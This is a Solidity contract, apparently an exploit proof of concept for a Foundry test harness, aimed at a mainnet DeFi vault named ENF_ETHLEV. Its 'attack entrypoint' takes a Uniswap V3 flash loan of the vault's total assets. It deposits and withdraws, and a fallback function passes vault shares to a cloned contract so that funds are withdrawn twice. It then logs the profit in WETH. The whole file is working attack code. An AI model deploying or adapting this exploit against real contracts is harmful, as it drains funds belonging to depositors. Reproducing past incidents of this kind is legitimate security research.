import {RuinLocation} from "./ruins/RuinLocation.sol";

import {
    USDC,
    WETH,
    UNISWAPV3_USDC_WETH_POOL
} from "src/constants/mainnet.sol";

import "src/interfaces/tokens/IERC20.sol";
import "src/interfaces/tokens/IWETH.sol";

import {ClonesUpgradeable} from "src/lib/upgradable/proxy/ClonesUpgradeable.sol";
import {UniswapV3FlashloanHelper} from "src/lib/flashloan/uniswap/v3/UniswapV3FlashloanHelper.sol";

import "forge-std/console.sol";


interface IENF_ETHLEV {
    function deposit(uint256 amount, address to) external payable returns(uint256);

    function withdraw(uint256 amount, address to) external returns(uint256);

    function convertToAssets(uint256 shares) external view returns(uint256);

    function totalAssets() external view returns(uint256);
}


contract Shaman is RuinLocation, UniswapV3FlashloanHelper {
    function peek() external {}

    address payable private totem;
    // attack entrypoint
    function beat() external {
        totem = payable(ClonesUpgradeable.clone(address(this)));

        uint _totalAssets = IENF_ETHLEV(ENF_ETHLEV).totalAssets();
        bytes memory _data = abi.encode(_totalAssets);
        borrow(UNISWAPV3_USDC_WETH_POOL, 0, _totalAssets, _data);

        console.log("[>*BOOM*<] Profit = %s WETH", IERC20(WETH).balanceOf(address(this)));
    }

    function _flashloanLogic(bytes memory data) internal override {
        uint256 _totalAssets = abi.decode(data, (uint256));
        IWETH(WETH).withdraw(_totalAssets);

        IERC20(USDC).approve(ENF_ETHLEV, _totalAssets);
        uint256 _shares = IENF_ETHLEV(ENF_ETHLEV).deposit{value: _totalAssets}(_totalAssets, address(this));
        uint256 _amountOut = IENF_ETHLEV(ENF_ETHLEV).convertToAssets(_shares);
        IENF_ETHLEV(ENF_ETHLEV).withdraw(_amountOut, address(this));
        
        Shaman(totem).tbeat();
        IWETH(WETH).deposit{value: address(this).balance}();
    }
    function _isShaman() private returns(bool) {
        return totem != address(0);
    }

    function _shamanFallback() private {
        if (msg.sender == WETH) return;

        if (msg.sender == CONTROLLER) {
            IERC20(ENF_ETHLEV).transfer(totem, IERC20(ENF_ETHLEV).balanceOf(address(this)));
        }
    }

    fallback() external payable {
        if (!_isShaman()) return;
        
        _shamanFallback();
    }

    function tbeat() external {
        uint _assets = IENF_ETHLEV(ENF_ETHLEV).convertToAssets(IERC20(ENF_ETHLEV).balanceOf(address(this)));
        IENF_ETHLEV(ENF_ETHLEV).withdraw(_assets, msg.sender);
    }
}